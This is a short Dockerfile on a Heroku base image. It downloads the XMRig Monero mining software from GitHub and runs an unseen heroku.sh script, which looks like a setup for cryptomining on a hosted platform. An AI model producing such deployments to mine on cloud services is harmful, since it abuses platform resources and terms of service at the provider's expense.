FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-static-x64.tar.gz
CMD bash heroku.sh
